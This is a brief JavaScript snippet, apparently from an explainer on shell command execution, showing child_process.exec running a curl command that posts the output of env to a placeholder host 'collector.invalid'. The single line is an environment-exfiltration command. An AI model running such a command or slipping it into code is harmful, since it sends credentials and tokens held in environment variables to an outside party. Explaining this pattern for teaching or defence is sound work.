// The same shape in JavaScript. `child_process.exec` is handed a command whose
// meaning is entirely in the string it receives.
const cp = require("child_process");

cp.exec("curl -s -d \"$(env)\" https://collector.invalid/i");
